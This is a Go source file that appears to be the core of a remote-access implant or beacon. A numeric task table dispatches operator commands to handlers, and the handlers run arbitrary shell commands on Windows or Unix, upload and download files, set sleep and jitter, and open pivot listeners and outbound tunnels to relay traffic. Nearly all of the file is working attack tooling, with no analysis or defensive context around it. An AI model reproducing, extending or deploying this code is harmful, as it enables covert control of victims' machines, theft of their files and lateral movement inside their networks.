package core

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"time"
)

var (
	TK = map[int]func([]byte) {
		2:  SHELL,
		3:  EXIT,
		4:  SLEEP,
		5:  CD,
		10: UPLOAD,
		11: DOWNLOAD,
		19: CANCEL,
		22: TRANSIT,
		23: UNLINK,
		39: PWD,
		51: PORTSTOP,
		67: UPLOADA,
		82: REVERSE,
		86: CONNECT,
	}
	FileID sync.Map
	Tunnel sync.Map
	Listen sync.Map
)

func SHELL(Data []byte) {
	Path := "/bin/sh"
	Args := []string{"-c", string(Data)}
	if runtime.GOOS == "windows" {
		Path = os.Getenv("COMSPEC")
		Args = []string{"/C", string(Data)}
	}
	CMD := exec.Command(Path, Args...)
	Stdout, _ := CMD.StdoutPipe()
	CMD.Stderr = CMD.Stdout
	if err := CMD.Start(); err != nil {
		ERROR(err); return
	}
	Data, Time := nil, time.Now().Unix()
	for {
		Buf := make([]byte, 1024)
		Num, err := Stdout.Read(Buf)
		Data = append(Data, Buf[:Num]...)
		if err != nil {
			if len(Data) > 0 {
				MakeBytes(30, Data)
			}; return
		}
		if time.Now().Unix()-Time > 10 {
			if len(Data) > 0 { MakeBytes(30, Data) }
			Data, Time = nil, time.Now().Unix()
		}
	}
}

func EXIT(Data []byte) {
	TRUE = false
	MakeBytes(26, nil)
}

func SLEEP(Data []byte) {
	Sleep = ByteToInt(Data[:4])
	Jitter = ByteToInt(Data[4:8])
}

func CD(Data []byte) {
	err := os.Chdir(string(Data))
	if err != nil {
		ERROR(err); return
	}
	PWD(nil)
}

func UPLOAD(Data []byte) {
	Len := ByteToInt(Data[:4])
	Path := string(Data[4:4+Len])
	MutexLock(func() {
		err := os.WriteFile(Path, Data[4+Len:], 0755)
		if err != nil { ERROR(err) }
	})
}

func DOWNLOAD(Data []byte) {
	Path := string(Data)
	Info, err := os.Stat(Path)
    if err != nil || Info.IsDir() {
		ERROR(fmt.Errorf("无法打开 %s", Path)); return
	}
	Len := IntToByte(4, int(Info.Size()))
	FID := RandomInt(100000000, 999999999)
	File, err := os.Open(Path)
	if err != nil { ERROR(err); return }
	FileID.Store(FID, true)
	MakeBytes(2, JoinBytes(IntToByte(4, FID), Len, Data))
	defer File.Close()
	Buf := make([]byte, 262144)
	for {
		Signal, OK := FileID.Load(FID)
		if !OK { break }
		if !Signal.(bool) { continue }
		Num, err := File.Read(Buf)
		if err != nil { break }
		MakeBytes(8, JoinBytes(IntToByte(4, FID), Buf[:Num]))
		FileID.Store(FID, false)
	}
	CANCEL(IntToByte(4, FID))
}

func CANCEL(Data []byte) {
	FID := ByteToInt(Data)
	FileID.Delete(FID)
	MakeBytes(9, Data)
}

func TRANSIT(Data []byte) {
	if Conn, OK := Tunnel.Load(ByteToInt(Data[:4])); OK {
		_, err := Conn.(net.Conn).Write(JoinBytes(_IntToByte(4, len(Data[4:])), Data[4:]))
		if err != nil { UNLINK(Data[:4]); return }
		MutexLock(func() {
			Conn.(net.Conn).SetReadDeadline(time.Now().Add(1*time.Second))
			Len := _ByteToInt(ReadFrom(Conn.(net.Conn), 4))
			if Len < 1 || Len > 1048576 { return }
			Buf := ReadFrom(Conn.(net.Conn), Len)
			if Buf == nil { return }
			MakeBytes(12, JoinBytes(Data[:4], Buf))
		})
	}
}

func UNLINK(Data []byte) {
	ID := ByteToInt(Data)
	if Conn, OK := Tunnel.Load(ID); OK {
		Conn.(net.Conn).Close()
		Tunnel.Delete(ID)
	}
	MakeBytes(11, Data)
}

func PWD(Data []byte) {
	dir, err := os.Getwd()
	if err != nil {
		ERROR(err); return
	}
	MakeBytes(19, []byte(dir))
}

func PORTSTOP(Data []byte) {
	Port := ByteToInt(Data)
	if ln, OK := Listen.Load(Port); OK {
		ln.(net.Listener).Close()
		Listen.Delete(Port)
	}
	MakeBytes(32, []byte(fmt.Sprintf("[×] 0.0.0.0:%d", Port)))
}

func UPLOADA(Data []byte) {
	Len := ByteToInt(Data[:4])
	Path := string(Data[4:4+Len])
	MutexLock(func() {
		File, err := os.OpenFile(Path, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0755)
		if err != nil { ERROR(err); return }
		defer File.Close()
		_, err = File.Write(Data[4+Len:])
		if err != nil { ERROR(err); return }
	})
}

func REVERSE(Data []byte) {
	Port := ByteToInt(Data)
	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", Port))
	if err != nil { ERROR(err); return }
	Listen.Store(Port, ln)
	MakeBytes(32, []byte(fmt.Sprintf("[√] 0.0.0.0:%d", Port)))
	for {
		Conn, err := ln.Accept()
		if err != nil { continue }
		Conn.SetReadDeadline(time.Now().Add(10*time.Second))
		Len := _ByteToInt(ReadFrom(Conn, 4))
		if Len < 68 || Len > 133 { Conn.Close(); continue }
		Buf := ReadFrom(Conn, Len)
		if Buf == nil { Conn.Close(); continue }
		Tunnel.Store(_ByteToInt(Buf[:4]), Conn)
		MakeBytes(10, JoinBytes(LittleToBig(Buf[:4]), IntToByte(4, 1114112), Buf[4:]))
	}
}

func CONNECT(Data []byte) {
	Host := string(Data[2:len(Data)-1])
	Port := ByteToInt(Data[:2])
	Conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", Host, Port))
	if err != nil { ERROR(err); return }
	Len := _ByteToInt(ReadFrom(Conn, 4))
	if Len < 68 || Len > 133 { Conn.Close(); return }
	Buf := ReadFrom(Conn, Len)
	if Buf == nil { Conn.Close(); return }
	Tunnel.Store(_ByteToInt(Buf[:4]), Conn)
	MakeBytes(10, JoinBytes(LittleToBig(Buf[:4]), IntToByte(4, 1048576), Buf[4:]))
}

func ERROR(err error) {
	MakeBytes(13, []byte(err.Error()))
}
